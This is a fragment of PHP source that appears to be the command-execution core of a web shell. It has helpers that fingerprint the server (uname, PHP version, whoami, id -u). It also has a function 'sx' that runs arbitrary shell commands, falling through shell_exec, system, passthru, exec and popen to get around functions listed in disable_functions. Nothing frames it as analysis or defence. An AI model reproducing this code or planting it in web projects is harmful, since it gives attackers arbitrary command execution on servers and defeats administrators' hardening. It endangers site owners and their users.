function safe_php_uname($mode="s"){
    if(function_exists("php_uname")&&!in_array("php_uname",array_map("trim",explode(",",(string)ini_get("disable_functions"))))){return @php_uname($mode);}
    if(function_exists("shell_exec")&&!in_array("shell_exec",array_map("trim",explode(",",(string)ini_get("disable_functions"))))){
        $map=array("s"=>"uname -s","r"=>"uname -r","m"=>"uname -m","v"=>"uname -v","n"=>"uname -n","a"=>"uname -a");
        $cmd=isset($map[$mode])?$map[$mode]:"uname -s";
        $r=trim(@shell_exec($cmd));
        if($r)return $r;
    }
    if($mode==="s"&&defined("PHP_OS"))return PHP_OS;
    if($mode==="s"&&defined("PHP_OS_FAMILY"))return PHP_OS_FAMILY;
    return "unknown";
}
function safe_phpversion(){
    if(function_exists("phpversion")){return @phpversion();}
    if(defined("PHP_VERSION"))return PHP_VERSION;
    return "unknown";
}
function safe_whoami(){
    $df=array_map("trim",explode(",",(string)ini_get("disable_functions")));
    if(function_exists("shell_exec")&&!in_array("shell_exec",$df)){$u=trim(@shell_exec("whoami"));if($u)return $u;}
    if(function_exists("posix_getpwuid")&&function_exists("posix_geteuid")){$i=@posix_getpwuid(@posix_geteuid());if($i&&isset($i["name"]))return $i["name"];}
    if(function_exists("get_current_user"))return @get_current_user();
    return "unknown";
}
function safe_uid(){
    $df=array_map("trim",explode(",",(string)ini_get("disable_functions")));
    if(function_exists("shell_exec")&&!in_array("shell_exec",$df)){$u=trim(@shell_exec("id -u"));if($u)return $u;}
    if(function_exists("posix_geteuid")){return @posix_geteuid();}
    return "?";
}
function sx($c){
    $df=array_map("trim",explode(",",(string)ini_get("disable_functions")));
    if(function_exists("shell_exec")&&!in_array("shell_exec",$df))return @shell_exec($c);
    if(function_exists("system")&&!in_array("system",$df)){ob_start();@system($c);return ob_get_clean();}
    if(function_exists("passthru")&&!in_array("passthru",$df)){ob_start();@passthru($c);return ob_get_clean();}
    if(function_exists("exec")&&!in_array("exec",$df)){@exec($c,$o);return implode("\n",$o);}
    if(function_exists("popen")&&!in_array("popen",$df)){$h=@popen($c,"r");if($h){$r="";while(!feof($h))$r.=fread($h,4096);pclose($h);return $r;}}

    return "[exec disabled]";
}
